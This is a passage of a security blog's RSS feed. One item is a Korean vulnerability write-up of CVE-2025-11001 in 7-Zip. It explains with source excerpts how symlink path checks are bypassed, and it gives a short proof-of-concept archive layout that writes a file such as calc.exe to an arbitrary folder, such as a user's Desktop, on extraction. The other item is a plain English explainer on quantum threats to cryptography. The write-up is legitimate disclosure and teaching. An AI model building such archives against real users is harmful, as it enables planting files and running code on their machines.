&#xC5EC;&#xBD80;)</li></ul><hr><h3 id="Issue-1"><a href="#Issue-1" class="headerlink" title="Issue #1"></a>Issue #1</h3><p>&#xB9AC;&#xB205;&#xC2A4; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; &#xC708;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0C0;&#xC77C;&#xC758; <code>C:\</code> &#xACBD;&#xB85C;&#xB85C; &#xC124;&#xC815;&#xB420; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> SUPPORT_LINKS</span><span class="hljs-keyword">if</span> (repraseMode){  _curSize = reparseSize;  _curSize_Defined = <span class="hljs-literal">true</span>;    <span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> SUPPORT_LINKS</span>  <span class="hljs-keyword">if</span> (needSetReparse)  {    <span class="hljs-keyword">if</span> (!DeleteFileAlways(_diskFilePath))    {      RINOK(SendMessageError_with_LastError(<span class="hljs-string">&quot;can&apos;t delete file&quot;</span>, _diskFilePath))    }    {      <span class="hljs-keyword">bool</span> linkWasSet = <span class="hljs-literal">false</span>;      RINOK(SetFromLinkPath(_diskFilePath, linkInfo, linkWasSet))      <span class="hljs-keyword">if</span> (linkWasSet)        _isSymLinkCreated = linkInfo.IsSymLink();      <span class="hljs-keyword">else</span>        _needSetAttrib = <span class="hljs-literal">false</span>;    }  }  <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>}<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></code></pre><p>&#xB9C1;&#xD06C; &#xACBD;&#xB85C;&#xB294; &#xC804;&#xCCB4; C:\ &#xACBD;&#xB85C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC9C0;&#xB9CC;, &#xD30C;&#xC11C;&#xB294; &#xC808;&#xB300; &#xACBD;&#xB85C; &#xD310;&#xB2E8;&#xC744; &#xB9AC;&#xB205;&#xC2A4; &#xC2A4;&#xD0C0;&#xC77C;&#xC758; &#xAC80;&#xC0AC;&#xB85C; &#xB530;&#xB974;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xADF8; &#xB9C1;&#xD06C;&#xB97C; <strong>relative</strong>&#xB85C; &#xD45C;&#xAE30;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Issue-2"><a href="#Issue-2" class="headerlink" title="Issue #2"></a>Issue #2</h3><p>SetFromLinkPath&#xB294; &#xC9C0;&#xC815;&#xB41C; &#xACBD;&#xB85C;&#xB85C; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xC808;&#xB300; &#xACBD;&#xB85C;&#xB85C; &#xB9C1;&#xD06C;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xB294; &#xC548;&#xC804; &#xC7A5;&#xCE58;&#xAC00; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC874;&#xC7AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (linkInfo.isRelative)  relatPath = GetDirPrefixOf(_item.Path);relatPath += linkInfo.linkPath;<span class="hljs-keyword">if</span> (!IsSafePath(relatPath)){  <span class="hljs-keyword">return</span> SendMessageError2(        <span class="hljs-number">0</span>, <span class="hljs-comment">// errorCode</span>        <span class="hljs-string">&quot;Dangerous link path was ignored&quot;</span>,        us2fs(_item.Path),        us2fs(linkInfo.linkPath)); <span class="hljs-comment">// us2fs(relatPath)</span>}</code></pre><p>7-Zip&#xC740; &#xC0C8;&#xB85C; &#xCD94;&#xCD9C;&#xB418;&#xB294; zip &#xD30C;&#xC77C; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xB9C1;&#xD06C;&#xAC00; &#xAC00;&#xB9AC;&#xD0AC; &#xC0C1;&#xB300; &#xBAA9;&#xC801;&#xC9C0; &#xACBD;&#xB85C;&#xB97C; &#xAD6C;&#xC131;&#xD55C; &#xD6C4; <code>IsSafePath</code>&#xB85C; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC0C1;&#xB300; &#xB9C1;&#xD06C;&#xC758; &#xACBD;&#xC6B0; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; &#xC704;&#xCE58;&#xD55C; zip &#xB0B4;&#xBD80; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; &#xB9C1;&#xD06C; &#xACBD;&#xB85C; &#xC55E;&#xC5D0; &#xB367;&#xBD99;&#xC5EC; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Issue-3"><a href="#Issue-3" class="headerlink" title="Issue #3"></a>Issue #3</h3><p>Issue 1&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB4EF;, &#xC0C1;&#xB300;&#xB9C1;&#xD06C;&#xB85C; &#xC798;&#xBABB; &#xD310;&#xB2E8;&#xB418;&#xC5B4; <code>isRelative == true</code> &#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; zip&#xC758; &#xB8E8;&#xD2B8;&#xAC00; &#xC544;&#xB2CC; &#xC544;&#xBB34; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC548;&#xC5D0; &#xC788;&#xC73C;&#xBA74;, &#xADF8; &#xB0B4;&#xBD80; &#xACBD;&#xB85C;&#xAC00; &#xB9C1;&#xD06C; &#xC55E;&#xC5D0; &#xB354;&#xD574;&#xC838;&#xC11C; &#xAC80;&#xC0AC; &#xC2DC; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xAC80;&#xC0AC;&#xB294; <code>IsSafePath(&quot;some/directory/in/zip&quot; + &quot;C:\some\other\path&quot;)</code>&#xCC98;&#xB7FC; &#xD3C9;&#xAC00;&#xB418;&#xBA70;, &#xC774; &#xACBD;&#xC6B0; true&#xB85C; &#xD310;&#xC815;&#xB418;&#xC5B4; &#xD1B5;&#xACFC;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Issue-4"><a href="#Issue-4" class="headerlink" title="Issue #4"></a>Issue #4</h3><p>&#xC2E4;&#xC81C; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xB9C1;&#xD06C; &#xACBD;&#xB85C;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC80;&#xC0AC;&#xAC00; &#xC788;&#xC5B4;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, &#xADF8; &#xC774;&#xC804;&#xC5D0; &#xC8FC;&#xC5B4;&#xC9C4; &#x2018;item(&#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;)&#x2019;&#xC774; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (!_ntOptions.SymLinks_AllowDangerous.Val){  <span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN32</span>  <span class="hljs-keyword">if</span> (_item.IsDir) <span class="hljs-comment">// NOPE</span>  <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>  <span class="hljs-keyword">if</span> (linkInfo.isRelative)    {      CLinkLevelsInfo levelsInfo;      levelsInfo.Parse(linkInfo.linkPath);      <span class="hljs-keyword">if</span> (levelsInfo.FinalLevel &lt; <span class="hljs-number">1</span> || levelsInfo.IsAbsolute)      {        <span class="hljs-keyword">return</span> SendMessageError2(          <span class="hljs-number">0</span>, <span class="hljs-comment">// errorCode</span>          <span class="hljs-string">&quot;Dangerous symbolic link path was ignored&quot;</span>,          us2fs(_item.Path),          us2fs(linkInfo.linkPath));      }    }}</code></pre><p>&#xC774;&#xB54C;, &#xD56D;&#xBAA9;&#xC740; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xC544;&#xB2C8;&#xBBC0;&#xB85C; &#xD1B5;&#xACFC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xC0AC;&#xC2E4;&#xC0C1; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xAC00; &#xC6B0;&#xD68C;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Issue-5"><a href="#Issue-5" class="headerlink" title="Issue #5"></a>Issue #5</h3><p>&#xC704; 4&#xAC00;&#xC9C0;&#xC758; Issue&#xB97C; &#xBAA8;&#xB450; &#xB9C8;&#xCE58;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// existPath -&gt; C:\some\other\path (symlink destination)</span><span class="hljs-comment">// data -&gt; path for symlink to be created </span><span class="hljs-comment">// Initializes reparse data for symlink creation</span><span class="hljs-keyword">if</span> (!FillLinkData(data, fs2us(existPath), !linkInfo.isJunction, linkInfo.isWSL))  <span class="hljs-keyword">return</span> SendMessageError(<span class="hljs-string">&quot;Cannot fill link data&quot;</span>, us2fs(_item.Path));<span class="hljs-comment">/// ...</span><span class="hljs-comment">// creates symlink</span><span class="hljs-keyword">if</span> (!NFile::NIO::SetReparseData(fullProcessedPath, _item.IsDir, data, (DWORD)data.Size())){  RINOK(SendMessageError_with_LastError(kCantCreateSymLink, fullProcessedPath))  <span class="hljs-keyword">return</span> S_OK;}</code></pre><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="hljs cpp">data/link -&gt; (symlink) C:\Users\YOURUSERNAME\Desktop (&#xB610;&#xB294; &#xC6D0;&#xD558;&#xB294; &#xB2E4;&#xB978; &#xC704;&#xCE58;)data/link -&gt; (Directory)data/link/calc.exe -&gt; (&#xCD94;&#xCD9C; &#xC2DC; &#xB300;&#xC0C1; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC4F0;&#xACE0;&#xC790; &#xD558;&#xB294; &#xD30C;&#xC77C;)</code></pre><p>&#xC2EC;&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xAD6C;&#xC870;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC555;&#xCD95;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xACBD;&#xC6B0; link(&#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;)&#xAC00; &#xBA3C;&#xC800; &#xD480;&#xB824; &#xC0DD;&#xC131;&#xB418;&#xACE0;, &#xC774;&#xD6C4; calc.exe&#xAC00; symlink&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC2E4;&#xC81C; &#xC704;&#xCE58;(&#xC608;: C:\Users\YOURUSERNAME\Desktop)&#xB85C; &#xD480;&#xB824; &#xC4F0;&#xC5EC;&#xC9D1;&#xB2C8;&#xB2E4;. 7-Zip&#xC774; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xB97C; &#xB530;&#xB77C;&#xAC00;&#xC11C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC784;&#xC758;&#xC758; &#xC704;&#xCE58;&#xC5D0; &#xC4F0;&#xAC8C; &#xB418;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/pacbypass/CVE-2025-11001">https://github.com/pacbypass/CVE-2025-11001</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/7-zip/">7-zip</category>
      
      <category domain="https://hackyboiz.github.io/tags/zip/">zip</category>
      
      <category domain="https://hackyboiz.github.io/tags/symlink/">symlink</category>
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path-traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-11001/">CVE-2025-11001</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-11002/">CVE-2025-11002</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/18/clalxk/CVE-2025-11001/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] The Quantum Threat to Classical Security (en)</title>
      <link>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/en/</link>
      <guid>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/en/</guid>
      <pubDate>Sun, 12 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;1-Introduction&quot;&gt;&lt;a href=&quot;#1-Introduction&quot; class=&quot;headerlink&quot; title=&quot;1. Introduction&quot;&gt;&lt;/a&gt;1. Introduction&lt;/h2&gt;&lt;p&gt;Hello! Today, I&amp;#x20</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h2><p>Hello! Today, I&#x2019;d like to take a break and talk about quantum computers. In recent years, as quantum computing technology has advanced rapidly, we&#x2019;re seeing that existing cryptographic systems, which we&#x2019;ve long believed to be secure, are under threat.</p><p>The reason is that most cryptography relies on the assumption that certain calculations are difficult. For example, RSA is based on the difficulty of factoring large numbers, while ECDHE relies on the difficulty of computing discrete logarithms over elliptic curves. However, quantum computers can perform these calculations much faster than classical computers.</p><p>This is possible due to the properties of quantum superposition and entanglement, which allow multiple paths to be considered simultaneously in a single operation. As a result, cryptanalysis that was previously considered &#x201C;practically impossible&#x201D; has become theoretically feasible.</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image.png" alt></p><p>The point at which quantum computers can decrypt current cryptography is called <strong>Q-Day (Quantum Day)</strong>. While the exact timing of Q-Day remains uncertain, major companies like IBM, Google, IonQ, and Syquantum are striving to build quantum computers with hundreds of qubits. Consequently, the IT industry views Q-Day not as mere speculation but as a tangible risk.</p><p>Therefore, today we&#x2019;ll cover the fundamental characteristics of quantum computers and the algorithms they use to break existing encryption. I&#x2019;ll explain it as clearly as possible!</p><h2 id="2-Quantum-Computers"><a href="#2-Quantum-Computers" class="headerlink" title="2. Quantum Computers"></a>2. Quantum Computers</h2><p>Quantum computers operate on principles entirely different from conventional digital computers. While traditional computers represent information using two states&#x2014;0 and 1&#x2014;as electrical signals, quantum computers express information using units called &#x2018;qubits&#x2019;.</p><p>A qubit doesn&#x2019;t simply hold one value, either 0 or 1. Through a state called quantum superposition, it can exist in a state where 0 and 1 are present simultaneously. This allows quantum computers to perform parallel computations, unlike conventional computers.</p><p>Mathematically, the state of a qubit can be expressed as follows:</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image1.png" alt></p><p>Here, &#x3B1; and &#x3B2; are probability amplitudes, and these two values always satisfy the relationship &#x2223;&#x3B1;&#x2223;&#xB2; + &#x2223;&#x3B2;&#x2223;&#xB2; = 1. This means a qubit exists in a state simultaneously containing the &#x201C;probability of being 0 (&#x2223;&#x3B1;&#x2223;^2)&#x201D; and the &#x201C;probability of being 1 (&#x2223;&#x3B2;&#x2223;^2)&#x201D;. This state exists probabilistically until we measure it; once measured, it collapses into a single value.</p><p>Thanks to this property, quantum computers can explore multiple possibilities simultaneously in a single operation&#x2014;something classical computers must compute sequentially. Consequently, quantum computers can achieve vastly faster computation speeds than classical computers for specific problems (e.g., factorization, optimization, search, etc.).</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image2.png" alt></p><blockquote><p>Source: &#x201C;Concise Insights into Quantum Machine Learning and Its Practical Uses&#x201D; (Sanati &amp; Borzoei, 2024, DOI: 10.13140/RG.2.2.14216.64002)</p></blockquote><h3 id="2-1-Quantum-Superposition"><a href="#2-1-Quantum-Superposition" class="headerlink" title="2.1 Quantum Superposition"></a>2.1 Quantum Superposition</h3><p>Quantum superposition is one of the most fundamental properties of quantum computers, referring to the phenomenon where <strong>a single qubit can exist in multiple states simultaneously</strong>. As explained earlier, while classical computers execute calculations sequentially along &#x2018;one path,&#x2019; quantum computers perform calculations in parallel by &#x2018;exploring multiple paths simultaneously.&#x2019;</p><p>For example, with 10 qubits, a quantum computer can simultaneously consider 2^10 = 1024 states in a single operation. This parallelism enables computational efficiency far surpassing classical methods!</p><p>However, qubits in superposition states are highly sensitive to external environments and can easily collapse due to factors like noise or decoherence. Therefore, the biggest challenge in practical quantum computer implementation is how stably these superposition states can be maintained.</p><h3 id="2-2-Quantum-Entanglement"><a href="#2-2-Quantum-Entanglement" class="headerlink" title="2.2 Quantum Entanglement"></a>2.2 Quantum Entanglement</h3><p>Quantum entanglement is the phenomenon where two or more qubits become bound together in a state where they are not independent. That is, <strong>if the state of one qubit changes, the state of another entangled qubit also changes instantly</strong>. Einstein famously questioned this phenomenon, calling it &#x201C;spooky action at a distance.&#x201D; However, experiments like Bell&#x2019;s inequality tests and those by Alain Aspect (1982) later proved its existence.</p><p>In quantum computers, this entanglement enables simultaneous processing of computational dependencies between qubits. Entanglement allows operations to be connected in parallel, and by leveraging the correlation of information, specific computational results can be amplified or unnecessary outcomes eliminated, thereby strengthening the pattern leading to the correct answer. For example, measuring one qubit in an entangled pair automatically determines the state of the other qubit. This property enables advanced operations like information transfer, state control, and error correction.</p><p>This entanglement phenomenon forms the basis for quantum computers to implement logically connected computational networks beyond mere parallel processing.</p><h3 id="2-3-Quantum-Interference"><a href="#2-3-Quantum-Interference" class="headerlink" title="2.3 Quantum Interference"></a>2.3 Quantum Interference</h3><p>Quantum interference strengthens the probability of the path leading to the correct answer among multiple paths in a superposition state, while weakening the probability of incorrect paths.</p><p>Quantum algorithms are designed to intentionally manipulate this interference so that the correct result is ultimately observed with a higher probability. For example, Grover&#x2019;s algorithm repeatedly enhances the probability of the correct solution among all possible solutions. This allows finding the correct answer among N pieces of data in O(&#x221A;n) time using a quantum algorithm, compared to O(N) time using classical methods.</p><p>If quantum superposition broadens the scope of computation, quantum interference can be seen as a filter that retains only the correct answer within that scope.</p><h2 id="3-Quantum-Algorithms"><a href="#3-Quantum-Algorithms" class="headerlink" title="3. Quantum Algorithms"></a>3. Quantum Algorithms</h2><p>The properties of quantum computers we&#x2019;ve examined&#x2014;superposition, entanglement, and interference&#x2014;are not merely &#x2018;fascinating physical phenomena&#x2019;. Utilizing these properties allows us to solve problems that are difficult for classical computers to tackle, far more efficiently.</p><p>Representative examples demonstrating the potential of quantum computation are Shor&#x2019;s algorithm and Grover&#x2019;s algorithm. While these algorithms weren&#x2019;t created &#x201C;to break classical cryptography,&#x201D; their computational principles ultimately undermined the security of the cryptographic systems we currently use.</p><h3 id="3-1-Shor&#x2019;s-Algorithm"><a href="#3-1-Shor&#x2019;s-Algorithm" class="headerlink" title="3.1 Shor&#x2019;s Algorithm"></a>3.1 Shor&#x2019;s Algorithm</h3><p>Shor&#x2019;s algorithm, proposed by Peter Shor in 1994, can perform <strong>polynomial-time integer factorization</strong>. On classical computers, factoring large numbers becomes incredibly difficult; breaking a 2048-bit RSA key would take billions of years, making it practically impossible. However, Shor&#x2019;s algorithm proved that using a quantum computer, this can be done in polynomial time.</p><p>The operating principle is somewhat complex, but simply put, it uses the quantum Fourier transform to rapidly identify the periodicity within a sequence. Knowing this periodicity allows one to naturally find the prime factors through the information revealed.</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image3.png" alt></p><p>This diagram is a simplified circuit representing the basic structure of Shor&#x2019;s algorithm. The qubits on the left initialize the input state and create a superposition state using the Hadamard gate (H). Next, each qubit performs a different Ua^{2^{n-1}} operation, reflecting the sequence&#x2019;s periodicity to obtain phase information. Finally, applying the inverse quantum Fourier transform (QFT&#x207B;&#xB9;) converts this into a form where the periodicity information can be measured.</p><p>Honestly, this part is hard to explain simply. I once got a B+ on a quantum cryptography exam question proving Shor&#x2019;s algorithm quantum circuit.</p><p>Anyway, why is this important? Because **almost all public-key cryptosystems like RSA, Diffie&#x2013;Hellman, and ECDSA operate on the assumption that &#x2018;factoring is difficult&#x2019;. In other words, if Shor&#x2019;s algorithm becomes practical, it could threaten the internet security we rely on today.</p><p>Of course, it&#x2019;s theoretically very powerful, but in reality, we haven&#x2019;t yet implemented enough stable logical qubits. So, while it&#x2019;s not at the level of breaking RSA immediately, the fact that it might be possible someday is why academia is actively researching the transition to post-quantum cryptography (PQC). PQC is another major topic, so I&#x2019;ll cover it later if the opportunity arises.</p><h3 id="3-2-Grover&#x2019;s-Algorithm"><a href="#3-2-Grover&#x2019;s-Algorithm" class="headerlink" title="3.2 Grover&#x2019;s Algorithm"></a>3.2 Grover&#x2019;s Algorithm</h3><p>Grover&#x2019;s algorithm is <strong>an algorithm that efficiently finds a specific item in an unordered database</strong>. If we were to find the answer to a problem by trying every possible case one by one, the classical approach would require an average of N/2 attempts for N candidates to find the correct answer. However, a quantum computer can find the correct answer in approximately &#x221A;N attempts using Grover&#x2019;s algorithm. This is possible because quantum computers utilize superposition and interference.</p><p>Grover&#x2019;s algorithm simultaneously superimposes all possible states, enabling all candidates to participate in the computation at once. It then applies an oracle operation that flips the phase only of the correct state, repeating this process while using interference to amplify the probability amplitude of the correct answer. Finally, when measured, the state with the highest probability of being correct remains.</p><p>This characteristic makes Grover&#x2019;s algorithm highly applicable across various fields, such as large-scale database searches and machine learning problems.</p><p>However, it simultaneously poses a threat capable of halving the security strength of symmetric-key cryptography or hash-based systems. For instance, while a classical computer requires 2^128 attempts to brute-force an AES-128 cipher, calculations show a quantum computer could achieve this in just 2^64 attempts.</p><p>While Grover&#x2019;s algorithm doesn&#x2019;t directly break public-key cryptography like Shor&#x2019;s algorithm does, it clearly demonstrated that quantum computers threaten not only public-key cryptography but also symmetric-key cryptography. Therefore, the security industry <strong>recommends using long keys like AES-256</strong>. Even considering Grover attacks, AES-256 remains sufficiently secure.</p><h2 id="4-Q-day"><a href="#4-Q-day" class="headerlink" title="4. Q-day"></a>4. Q-day</h2><p>No one can accurately predict when <strong>Q-Day (Quantum Day)</strong>&#x2014;the day quantum computers can actually decrypt current cryptography&#x2014;will arrive. However, we are currently in the NISQ (Noisy Intermediate-Scale Quantum) era.</p><p>It is literally the noisy intermediate-scale quantum computer era. While leading global IT companies have implemented hundreds of qubits, they remain unstable with high error rates, insufficient to break RSA. It&#x2019;s known that breaking RSA-2048 completely requires tens of millions of stable logical qubits, yet current hardware mostly remains at the level of hundreds of physical qubits.</p><p>Furthermore, error correction technology&#x2014;which groups multiple physical qubits to create a single logical qubit&#x2014;is still in the research phase. Therefore, we can consider this an era of learning how to operate quantum computers reliably.</p><p>Nevertheless, there is no disagreement that Q-Day <strong>will inevitably arrive someday</strong>. Governments and major institutions have already begun preparing for that moment. The U.S. National Institute of Standards and Technology (NIST) is driving the standardization of <strong>Post-Quantum Cryptography (PQC)</strong> and finalized its first set of candidate standards in 2024. The European Union, Korea&#x2019;s KISA, Japan&#x2019;s NICT, and others are also preparing accordingly.</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image4.png" alt></p><blockquote><p>Source: IMARC Group</p></blockquote><p>As governments and companies worldwide prepare for quantum threats, the quantum-resistant cryptography (PQC) market is also experiencing explosive growth. According to IMARC Group, the PQC market is projected to grow from approximately $300 million in 2024 to around $9.4 billion by 2033.</p><p>This article aims to explain the relationship between quantum computers and cryptography as simply as possible. If the opportunity arises, we&#x2019;ll explore what quantum-resistant cryptography (PQC) entails and why it&#x2019;s hailed as a core technology for the &#x201C;post-quantum era.&#x201D;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/crypto/">crypto</category>
      
      <category domain="https://hackyboiz.github.io/tags/quantum/">quantum</category>
      
      <category domain="https://hackyboiz.github.io/tags/quantumcomputing/">quantumcomputing</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/en/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
